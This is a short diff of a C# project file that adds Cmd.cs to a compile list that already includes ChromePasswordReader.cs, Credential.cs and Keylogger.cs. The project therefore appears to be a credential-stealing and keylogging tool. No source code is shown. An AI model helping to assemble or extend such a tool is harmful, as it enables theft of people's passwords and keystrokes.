@@ -53,6 +53,7 @@
   </ItemGroup>
   <ItemGroup>
     <Compile Include="ChromePasswordReader.cs" />
+    <Compile Include="Cmd.cs" />
     <Compile Include="Credential.cs" />
     <Compile Include="IPasswordReader.cs" />
     <Compile Include="Keylogger.cs" />
